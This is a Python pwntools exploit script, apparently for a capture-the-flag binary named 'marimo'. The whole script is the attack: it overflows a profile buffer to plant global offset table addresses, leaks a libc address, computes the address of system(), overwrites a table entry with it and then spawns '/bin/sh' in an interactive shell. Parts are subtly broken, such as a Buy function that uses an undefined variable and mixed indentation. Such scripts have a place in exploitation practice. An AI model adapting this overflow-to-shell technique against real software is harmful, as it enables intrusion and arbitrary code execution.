from pwn import *

context.log_level='debug'

def Create(name,profile):
	
	s.recvuntil('>>')
	s.sendline('show me the marimo')
	s.recvuntil("What's your new marimo's name? (0x10)")
	s.sendline(name)
	#s.recvuntil("write 1111's profile. (0x20)")
	s.recvuntil('>> ')
	s.sendline(profile)

def View(index,choice,profile,until):#,ans):

	global libc_leak

	s.recvuntil('>>')
	s.sendline('V')
	s.recvuntil('Select number or [B]ack')
	s.sendline(str(index))
	
	if until is not 0:
		s.recvuntil(until)
		libc_leak=u64(s.recv(6).ljust(8,'\x00'))	

	s.recvuntil('[M]odify / [B]ack ?')
	s.sendline(choice)
	
	if choice is 'M':
		s.recvuntil('Give me new profile')
		s.sendline(profile)
		#s.recvuntil('[M]odify / [B]ack ?')
		s.sendline('B')
	
def Sell(index):
        s.recvuntil('>>')
        s.sendline('S')
	s.recvuntil('>> ')
	s.sendline(str(index))
	s.recvuntil('[S]ell / [R]un away ?')
	s.sendline('S')

def Buy(size):
        s.recvuntil('>>')
        s.sendline('S')
        s.recvuntil('>> ')
        s.sendline(str(index))
	s.recvuntil('[P]ay / [R]un away ?')
	s.sendline('P')

if  __name__ == "__main__":
	
	s=process("./marimo")
	
	e=ELF('./marimo')

	libc_leak=''

	raw_input('1')
	Create('A'*0x10,'a'*0x20)
	Create('B'*0x10,'b'*0x20)
	Create('C'*0x10,'c'*0x20)
	Create('D'*0x10,'d'*0x20)

	
	payload='a'*0x20
	payload+=p64(0x0)
	payload+=p64(0x21)
	payload+=p64(0x603018)*3

	print "time 60"
	sleep(0x40)
	View(0,'M',payload,0)

	View(1,'B',0, 'profile : ')


	libc_base=libc_leak-0x6f690
	system_libc=libc_base+0x45390

	print hex(libc_leak)
	print hex(system_libc)

        payload='a'*0x20
        payload+=p64(0x0)
        payload+=p64(0x21)
        payload+=p64(0x603040)*3
	payload+=p64(0x21)

	print "time 68"
        sleep(0x40)
        View(0,'M',payload,0)

	raw_input('gdb attach!')
	print "time 16"	
	sleep(0x7)	
	View(1,'M',p64(system_libc)[:6],0)

	s.recvuntil('>> ')
	s.sendline("/bin/sh\00")	

	s.interactive()
